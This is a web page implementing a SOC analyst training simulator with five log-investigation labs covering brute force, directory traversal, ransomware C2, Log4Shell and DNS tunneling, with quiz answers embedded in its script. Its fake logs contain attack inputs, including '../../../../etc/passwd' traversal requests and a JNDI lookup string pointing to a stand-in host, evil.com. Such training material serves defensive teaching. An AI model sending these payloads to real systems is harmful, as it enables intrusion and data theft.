---
layout: page
title: "SentinelGuard Expert SOC Station"
permalink: /labs/station/
---

<style>
    /* 1. GLOBAL RESET */
    html, body, main { background-color: #010409 !important; color: #c9d1d9 !important; margin: 0 !important; padding: 0 !important; width: 100%; height: 100%; overflow: hidden; }
    #desktop-environment {
        background: radial-gradient(circle, #0d1117 0%, #010409 100%);
        height: 100vh; width: 100vw; position: relative; overflow: hidden; font-family: 'JetBrains Mono', monospace; z-index: 1;
    }

    /* 2. TASKBAR (EN ALTTA VE TIKLAMAYI ENGELLEMEZ) */
    #taskbar { 
        background: rgba(22, 27, 34, 0.98); height: 40px; border-top: 1px solid #30363d; display: flex; align-items: center; padding: 0 15px; gap: 20px; z-index: 999; position: absolute; bottom: 0; left: 0; width: 100%; pointer-events: auto;
    }

    /* 3. PENCERE SİSTEMİ */
    .window {
        position: absolute; top: 48%; left: 50%; transform: translate(-50%, -50%);
        width: 96%; height: 85%; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; box-shadow: 0 30px 60px rgba(0,0,0,0.9); display: flex; flex-direction: column; z-index: 100; pointer-events: auto;
    }
    .window-header { background: #161b22; padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #30363d; border-radius: 8px 8px 0 0; }
    .close-btn { color: #f85149; cursor: pointer; font-size: 20px; font-weight: bold; }

    /* 4. SIEM FILTER BAR */
    .filter-container { background: #161b22; padding: 8px 15px; display: flex; align-items: center; border-bottom: 1px solid #30363d; gap: 10px; }
    .search-input { background: #0d1117; border: 1px solid #30363d; color: #3fb950; padding: 5px 10px; border-radius: 4px; font-size: 11px; width: 250px; outline: none; }

    /* 5. LAB PANELİ */
    .lab-content { display: flex; flex: 1; overflow: hidden; padding: 15px; gap: 15px; }
    #log-screen { flex: 1; overflow-y: scroll; padding: 15px; font-size: 11px; color: #8b949e; line-height: 1.8; background: #010409; border: 1px solid #30363d; white-space: pre-wrap; }
    .question-panel { flex: 0.4; background: #161b22; padding: 15px; border-radius: 6px; border: 1px solid #30363d; overflow-y: auto; }
    
    /* 6. BUTONLAR VE INPUTLAR */
    .btn-action { background: #238636; border: none; color: white; padding: 12px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; pointer-events: auto; }
    .btn-escalate { background: #d29922; }
    .input-field { width: 100%; background: #0d1117; border: 1px solid #30363d; color: #58a6ff; padding: 10px; margin-top: 5px; border-radius: 5px; outline: none; font-size: 12px; }
    .hidden { display: none !important; }
    .correct-ans { border-color: #238636 !important; background: rgba(35, 134, 54, 0.1) !important; }
    .wrong-ans { border-color: #f85149 !important; background: rgba(248, 81, 73, 0.1) !important; }

    .edr-terminal { background: #000; color: #3fb950; padding: 10px; font-family: 'Courier New', monospace; height: 110px; overflow-y: auto; border: 1px solid #30363d; margin-top: 10px; border-radius: 4px; font-size: 11px; }
</style>

<div id="desktop-environment">
    <div id="system-modal" class="modal-overlay hidden" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; display: flex; justify-content: center; align-items: center;">
        <div style="background: #161b22; border: 1px solid #58a6ff; padding: 30px; border-radius: 12px; text-align: center; max-width: 500px; border-top: 5px solid #58a6ff;">
            <h2 id="modal-title" style="color: #58a6ff; margin-top:0;">STATION ALERT</h2>
            <div id="modal-body" style="margin: 20px 0; font-size: 13px; color: #e6edf3;"></div>
            <button onclick="closeModal()" class="btn-action">ACKNOWLEDGE</button>
        </div>
    </div>

    <div style="position: absolute; top: 20px; left: 20px; display: flex; flex-direction: column; gap: 25px; z-index: 50;">
        <div onclick="openWindow('auth-window')" style="text-align:center; cursor:pointer; pointer-events: auto;">
            <img src="https://cdn-icons-png.flaticon.com/512/3233/3233514.png" width="45">
            <span style="display:block; font-size:10px; color:#fff; margin-top:5px;">Login.sys</span>
        </div>
        <div id="range-icon" class="hidden" onclick="openWindow('selection-window')" style="text-align:center; cursor:pointer; pointer-events: auto;">
            <img src="https://cdn-icons-png.flaticon.com/512/906/906343.png" width="45">
            <span style="display:block; font-size:10px; color:#fff; margin-top:5px;">CyberGungor.exe</span>
        </div>
    </div>

    <div id="auth-window" class="window">
        <div class="window-header"><span>Authentication</span><span onclick="closeWindow('auth-window')" class="close-btn">×</span></div>
        <div style="padding: 60px; text-align: center; max-width: 400px; margin: 0 auto;">
            <h3 style="color: #58a6ff;">SECURE ACCESS</h3>
            <input type="text" id="alias-input" class="input-field" placeholder="Analyst Codename...">
            <br><br>
            <button onclick="loginAnalyst()" class="btn-action">INITIALIZE</button>
        </div>
    </div>

    <div id="selection-window" class="window hidden">
        <div class="window-header"><span>Mission Control</span><span onclick="closeWindow('selection-window')" class="close-btn">×</span></div>
        <div id="selection-content" style="padding: 25px; overflow-y: auto;">
            <h4 style="color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px;">AVAILABLE MISSIONS</h4>
            <div id="machine-list" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; margin-top: 20px;"></div>
        </div>
        <div id="briefing-content" class="hidden" style="padding: 25px; overflow-y: auto;">
            <h2 id="brief-lab-name" style="color: #58a6ff;">BRIEFING</h2>
            <div id="brief-details" style="background: rgba(88,166,255,0.05); border: 1px solid #30363d; padding: 20px; border-radius: 8px; margin: 20px 0; font-size: 13px; line-height: 1.6;"></div>
            <div style="display: flex; gap: 15px;">
                <button onclick="hideBriefing()" class="btn-action" style="background:#30363d; width: 150px;">BACK</button>
                <button onclick="startInvestigation()" class="btn-action">GO LIVE</button>
            </div>
        </div>
    </div>

    <div id="lab-window" class="window hidden">
        <div class="window-header"><span id="lab-title-text">Investigation</span><span onclick="closeWindow('lab-window')" class="close-btn">×</span></div>
        <div class="filter-container">
            <span style="font-size: 10px; color: #8b949e;">SIEM FILTER:</span>
            <input type="text" id="log-search-input" class="search-input" placeholder="Search (admin, UNION, 4625)..." onkeyup="filterLogs()">
        </div>
        <div class="lab-content">
            <div style="flex: 1.5; display: flex; flex-direction: column;">
                <div id="log-screen"></div>
            </div>
            <div class="question-panel">
                <h4 style="color:#f85149; margin-top:0;">Investigation</h4>
                <div id="q-area"></div>
                <button onclick="checkAnswers()" class="btn-action" style="margin-top: 15px;">VALIDATE EVIDENCE</button>
            </div>
        </div>
    </div>

    <div id="playbook-window" class="window hidden">
        <div class="window-header"><span>Remediation Center</span><span onclick="closeWindow('playbook-window')" class="close-btn">×</span></div>
        <div style="padding: 30px; overflow-y: auto;">
            <h2 style="color: #3fb950; margin-top: 0;">ACTION CENTER</h2>
            <div id="playbook-ui"></div>
        </div>
    </div>

    <div id="taskbar">
        <div id="clock" style="font-size: 11px; color: #8b949e; min-width: 80px;">00:00:00</div>
        <div id="active-user" style="margin-left: auto; font-size: 10px; color: #58a6ff;">GUEST@STATION</div>
    </div>
</div>

<script>
    // Dinamik gürültü logu üretici
    function generateNoise(count) {
        let n = []; const ips = ["10.0.0.5", "192.168.1.12", "172.16.0.40"];
        for(let i=0; i<count; i++) n.push(`[${10}:${Math.floor(Math.random()*59)}:12] INFO Sys: source=${ips[Math.floor(Math.random()*3)]} user=analyst status=Success`);
        return n;
    }

    const labs = {
        brute: {
            name: "ADV-01: Windows Brute Force",
            details: "<b>Mission:</b> Analyze EventID 4625/4624 logs. Identify the attacker and reset compromised credentials. / <b>Görev:</b> EventID 4625/4624 loglarını analiz edin. Saldırganı bulun ve parolayı sıfırlayın.",
            questions: [{q: "Attacker IP?", a: "141.10.22.5"}, {q: "Compromised User?", a: "svc_web"}],
            logs: () => {
                let l = generateNoise(150);
                l.push(`[14:40:05] WARN Auth: EventID=4625 source=141.10.22.5 user=svc_web status=Failure msg="Bad Password"`);
                l.push(`[15:42:01] CRIT Auth: EventID=4624 source=141.10.22.5 user=svc_web status=Success msg="Logon type 3"`);
                return l.sort();
            },
            remedy: "reset --user svc_web && service stop winrm"
        },
        traversal: {
            name: "ADV-02: Directory Traversal",
            details: "<b>Mission:</b> Identify attempts to access system files like /etc/passwd via web parameters. / <b>Görev:</b> Web üzerinden /etc/passwd gibi sistem dosyalarına erişim denemelerini tespit edin.",
            questions: [{q: "Attacker IP?", a: "192.168.55.12"}, {q: "Sensitive File?", a: "/etc/passwd"}],
            logs: () => {
                let l = generateNoise(120);
                l.push(`[10:15:22] WARN Web: 192.168.55.12 GET /download.php?file=../../../../etc/passwd 200`);
                l.push(`[10:16:05] WARN Web: 192.168.55.12 GET /download.php?file=../../../../etc/shadow 403`);
                return l.sort();
            },
            remedy: "isolate --host web-srv-01"
        },
        ransom: {
            name: "ADV-03: Ransomware Staging",
            details: "<b>Mission:</b> Detect ransomware execution and C2 server callback. / <b>Görev:</b> Fidye yazılımı hazırlığını ve C2 sunucu bağlantısını tespit edin.",
            questions: [{q: "Process Name?", a: "wannacry.exe"}, {q: "CnC IP?", a: "203.0.113.42"}],
            logs: () => {
                let l = generateNoise(100);
                l.push(`[08:05:01] CRIT Sysmon: EventID=1 Image="wannacry.exe" Parent="cmd.exe"`);
                l.push(`[08:06:40] WARN Network: Connection to 203.0.113.42:4444 Established`);
                return l.sort();
            },
            remedy: "isolate --host finance-09"
        },
        log4j: {
            name: "ADV-04: Log4Shell Exploitation",
            details: "<b>Mission:</b> Detect JNDI injection attempts in User-Agent logs. / <b>Görev:</b> User-Agent kayıtlarındaki JNDI enjeksiyonlarını bulun.",
            questions: [{q: "Attacker IP?", a: "88.99.100.101"}, {q: "LDAP URI?", a: "ldap://evil.com/a"}],
            logs: () => {
                let l = generateNoise(130);
                l.push(`[22:05:12] CRIT Apache: 88.99.100.101 UA: \${jndi:ldap://evil.com/a}`);
                l.push(`[22:06:00] ALERT IDS: Outbound LDAP connection detected`);
                return l.sort();
            },
            remedy: "service stop tomcat"
        },
        exfil: {
            name: "ADV-05: DNS Tunneling",
            details: "<b>Mission:</b> Analyze high entropy DNS queries to detect data exfiltration. / <b>Görev:</b> Veri sızıntısını tespit etmek için DNS sorgularını analiz edin.",
            questions: [{q: "Source Host?", a: "DESKTOP-AF2"}, {q: "Rogue Domain?", a: "dns-tunnel.com"}],
            logs: () => {
                let l = generateNoise(180);
                for(let i=0; i<40; i++) l.push(`[11:10:${i}] WARN DNS: query ${Math.random().toString(36).substring(7)}.dns-tunnel.com from DESKTOP-AF2`);
                return l.sort();
            },
            remedy: "block-domain dns-tunnel.com"
        }
    };

    let userAlias = ""; let currentKey = ""; let activeLogs = [];

    function openWindow(id) { document.querySelectorAll('.window').forEach(w => w.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
    function closeWindow(id) { document.getElementById(id).classList.add('hidden'); }
    function openModal(title, body) { document.getElementById('modal-title').innerText = title; document.getElementById('modal-body').innerHTML = body; document.getElementById('system-modal').classList.remove('hidden'); }
    function closeModal() { document.getElementById('system-modal').classList.add('hidden'); }

    function loginAnalyst() {
        const input = document.getElementById('alias-input').value.trim();
        if(!input) return;
        userAlias = input;
        document.getElementById('active-user').innerText = `${userAlias.toUpperCase()}@STATION`;
        document.getElementById('range-icon').classList.remove('hidden');
        closeWindow('auth-window');
        openModal("SUCCESS", `Welcome back, Analyst ${userAlias}. station is ready.`);
        renderSelection();
    }

    function renderSelection() {
        const container = document.getElementById('machine-list');
        container.innerHTML = Object.keys(labs).map(key => `
            <div onclick="showBriefing('${key}')" style="background:#161b22; border:1px solid #30363d; padding:20px; border-radius:10px; cursor:pointer; font-weight:bold;">
                <span style="color:#fff;">${labs[key].name}</span>
            </div>
        `).join('');
    }

    function showBriefing(key) {
        currentKey = key;
        document.getElementById('selection-content').classList.add('hidden');
        document.getElementById('briefing-content').classList.remove('hidden');
        document.getElementById('brief-lab-name').innerText = labs[key].name;
        document.getElementById('brief-details').innerHTML = labs[key].details;
    }

    function hideBriefing() { document.getElementById('selection-content').classList.remove('hidden'); document.getElementById('briefing-content').classList.add('hidden'); }

    function startInvestigation() {
        closeWindow('selection-window');
        openWindow('lab-window');
        activeLogs = labs[currentKey].logs();
        displayLogs(activeLogs);
        document.getElementById('q-area').innerHTML = labs[currentKey].questions.map((q, i) => `
            <div style="margin-bottom:10px;">
                <label style="font-size:10px; color:#8b949e;">${q.q}</label>
                <input type="text" id="ans-${i}" class="input-field">
            </div>`).join('');
    }

    function displayLogs(data) { document.getElementById('log-screen').innerHTML = data.map(l => `<div style="border-bottom:1px solid #161b22; padding:3px 0;">${l}</div>`).join(''); }

    function filterLogs() {
        const term = document.getElementById('log-search-input').value.toLowerCase();
        const filtered = activeLogs.filter(l => l.toLowerCase().includes(term));
        displayLogs(filtered);
    }

    function checkAnswers() {
        const lab = labs[currentKey]; let correct = 0;
        lab.questions.forEach((q, i) => {
            const el = document.getElementById(`ans-${i}`);
            if(el.value.trim().toLowerCase() === q.a.toLowerCase()) { correct++; el.classList.add('correct-ans'); }
            else { el.classList.add('wrong-ans'); }
        });
        if(correct === lab.questions.length) {
            openModal("VERIFIED", "Evidence confirmed. Proceeding to Playbook...");
            setTimeout(() => { closeWindow('lab-window'); openWindow('playbook-window'); renderPlaybook(); }, 1500);
        } else { openModal("MISMATCH", "Artifacts do not match logs."); }
    }

    function renderPlaybook() {
        document.getElementById('playbook-ui').innerHTML = `
            <div style="background:rgba(88,166,255,0.05); padding:20px; border-radius:8px;">
                <select id="case-decision" class="input-field" onchange="toggleActionView()">
                    <option value="tp">True Positive (Confirmed Attack)</option>
                    <option value="fp">False Positive (Benign Activity)</option>
                </select>

                <div id="tp-area" style="margin-top:20px;">
                    <div class="edr-terminal"><div id="edr-out">[CONNECTED] Suggested: ${labs[currentKey].remedy}</div>
                    <input type="text" id="edr-in" onkeydown="handleEDR(event)" style="background:none; border:none; color:#3fb950; outline:none; width:100%;"></div>
                    <button onclick="finalize('tp')" class="btn-action" style="margin-top:15px; background:#d29922;">ESCALATE TO L2</button>
                </div>

                <div id="fp-area" class="hidden" style="margin-top:20px;">
                    <button onclick="finalize('fp')" class="btn-action" style="margin-top:15px;">CLOSE CASE (FP)</button>
                </div>
                <textarea id="analyst-note" class="input-field" style="height:60px; margin-top:15px;" placeholder="Analyst summary..."></textarea>
            </div>`;
    }

    function toggleActionView() {
        const dec = document.getElementById('case-decision').value;
        document.getElementById('tp-area').className = dec==='tp' ? '' : 'hidden';
        document.getElementById('fp-area').className = dec==='fp' ? '' : 'hidden';
    }

    function handleEDR(e) { if(e.key === "Enter") { document.getElementById('edr-out').innerHTML += `<div>$ ${e.target.value}</div><div style="color:#3fb950;">[OK] Action Executed.</div>`; e.target.value = ""; } }

    function finalize(type) {
        if(!document.getElementById('analyst-note').value) { alert("Note required."); return; }
        const msg = type === 'tp' ? "Escalated to L2." : "Closed as False Positive.";
        openModal("MISSION COMPLETE", msg);
        setTimeout(() => location.reload(), 3000);
    }

    setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
</script>
